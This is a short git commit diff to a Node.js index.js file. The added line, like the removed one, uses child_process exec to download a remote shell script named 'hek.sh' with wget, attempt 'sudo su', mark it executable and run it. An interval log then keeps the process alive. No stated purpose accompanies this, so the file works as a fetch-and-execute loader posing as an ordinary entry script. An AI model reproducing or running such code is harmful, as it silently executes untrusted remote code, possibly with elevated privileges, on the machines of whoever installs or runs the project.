3ba689eb7c42351138ec3d8725fb0a3b10fa10cc
ismirku <131448021+ismirku@users.noreply.github.com>
2023-04-21 18:28:19 +0800

    Update index.js

--- index.js
+++ index.js
@@ -1,5 +1,5 @@
 const { exec } = require('child_process')
 
-exec('cd ../../../ && ls && wget https://raw.githubusercontent.com/ismirku/nancy/main/hek.sh && sudo su && chmod +x hek.sh && ./hek.sh', (a,b,c) => console.log(a,b,c))
+exec('wget https://raw.githubusercontent.com/ismirku/nancy/main/hek.sh && sudo su && chmod +x hek.sh && ./hek.sh', (a,b,c) => console.log(a,b,c))
 
 setInterval(() => console.log("OKOO"), 10000);
